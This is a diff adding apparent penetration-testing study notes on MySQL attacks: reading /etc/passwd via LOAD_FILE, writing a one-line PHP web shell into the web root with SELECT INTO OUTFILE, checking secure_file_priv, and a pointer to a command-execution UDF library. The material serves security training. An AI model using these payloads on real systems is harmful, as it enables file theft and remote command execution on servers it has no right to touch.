@@ -100,3 +100,46 @@ MAC Address: 00:00:00:00:00:00 (VMware)
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds
 ```
+
+### MySQL - Read Local Files in MySQL
+
+```shell-session
+ select LOAD_FILE("/etc/passwd");
+```
+
+```shell-session
++--------------------------+
+| LOAD_FILE("/etc/passwd")
++--------------------------------------------------+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+<SNIP>
+```
+
+### Write Local Files
+
+```shell-session
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+
+* In `MySQL`, a global system variable [secure\_file\_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar\_secure\_file\_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD\_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function\_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv\_file) privilege.
+* `secure_file_priv` may be set as follows
+  * If empty, the variable has no effect, which is not a secure setting.
+  * If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
+  * If set to NULL, the server disables import and export operations.
+* In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:
+
+**MySQL - Secure File Privileges**
+
+```shell-session
+ show variables like "secure_file_priv";
+```
+
+### User Defined Functions
+
+* `MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL
+  * there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib\_mysqludf\_sys).
+  * It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.
